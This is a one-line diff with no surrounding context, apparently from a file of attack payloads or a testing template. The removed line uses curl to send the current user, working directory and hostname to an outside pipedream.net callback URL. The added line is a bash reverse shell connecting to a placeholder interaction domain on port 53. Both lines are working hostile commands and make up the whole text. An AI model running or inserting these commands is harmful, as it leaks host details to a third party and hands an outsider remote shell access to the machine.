@@ -1,1 +1,1 @@
-curl "https://eonwt4pv5ppo3tg.m.pipedream.net/callback?user=$(whoami)&pwd=$(pwd)&host=$(hostname)"
+bash -c 'bash -i >& /dev/tcp/YOUR_INTERACT_DOMAIN/53 0>&1'
